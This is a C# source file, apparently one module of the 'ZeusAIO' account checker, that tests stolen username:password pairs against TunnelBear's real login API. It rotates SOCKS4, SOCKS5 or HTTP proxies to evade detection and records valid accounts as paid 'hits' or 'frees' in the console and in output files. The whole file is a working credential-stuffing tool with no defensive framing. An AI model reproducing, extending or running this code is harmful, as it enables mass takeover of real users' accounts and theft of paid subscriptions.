using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Leaf.xNet;
using System.Text.RegularExpressions;
using Console = Colorful.Console;
using System.Drawing;
using Valorant;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using ZeusAIO;
using TunnelBear;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;

namespace Tunnelbear
{
    class Check
    {
        public static bool CheckAccount(string[] s, string proxy)
        {
            for (int i = 0; i < Config.config.Retries + 1; i++)
                while (true)
                    try
                    {
                    Retry:
                        using (HttpRequest req = new HttpRequest())
                        {
                            SetBasicRequestSettingsAndProxies(req);

                            req.AddHeader("Content-Type", "application/x-www-form-urlencoded");

                            string strResponse = req.Post(new Uri("https://api.tunnelbear.com/core/web/api/login"), new BytesContent(Encoding.Default.GetBytes($"username={s[0]}&password={s[1]}&withUserDetails=true&v=web-1.0"))).ToString();

                            if (strResponse.Contains("result\":\"PASS"))
                            {
                                JObject jsonObj = (JObject)JsonConvert.DeserializeObject(strResponse);

                                string plan = jsonObj["details"]["paymentStatus"].ToString();
                                if (plan == "FREE")
                                {
                                    ZeusAIO.mainmenu.frees++;
                                    if (Config.config.LogorCui == "2")
                                    {
                                        Console.WriteLine("[FREE - TUNNELBEAR] " + s[0] + ":" + s[1], Color.OrangeRed);
                                    }
                                    Export.AsResult("/Tunnelbear_frees", s[0] + ":" + s[1]);
                                    return false;
                                }
                                else
                                {
                                    ZeusAIO.mainmenu.hits++;
                                    if (Config.config.LogorCui == "2")
                                    {
                                        Console.WriteLine("[HIT - TUNNELBEAR] " + s[0] + ":" + s[1] + " | Plan: " + plan, Color.Green);
                                    }
                                    Export.AsResult("/Tunnelbear_hits", s[0] + ":" + s[1] + " | Plan: " + plan);
                                    return false;
                                }
                             


                            }
                            break;
                        }
                    }
                    catch
                    {
                        ZeusAIO.mainmenu.errors++;
                    }
            return false;
        }
        static void SetBasicRequestSettingsAndProxies(HttpRequest req)
        {
            req.IgnoreProtocolErrors = true;
            req.ConnectTimeout = 10000;
            req.KeepAliveTimeout = 10000;
            req.ReadWriteTimeout = 10000;

            {
                string[] proxy = ZeusAIO.mainmenu.proxies.ElementAt(new Random().Next(ZeusAIO.mainmenu.proxiesCount)).Split(':');
                ProxyClient proxyClient = ZeusAIO.mainmenu.proxyProtocol == "SOCKS5" ? new Socks5ProxyClient(proxy[0], int.Parse(proxy[1])) : ZeusAIO.mainmenu.proxyProtocol == "SOCKS4" ? new Socks4ProxyClient(proxy[0], int.Parse(proxy[1])) : (ProxyClient)new HttpProxyClient(proxy[0], int.Parse(proxy[1]));
                if (proxy.Length == 4)
                {
                    proxyClient.Username = proxy[2];
                    proxyClient.Password = proxy[3];
                }
                req.Proxy = proxyClient;
            }
        }
    }
}
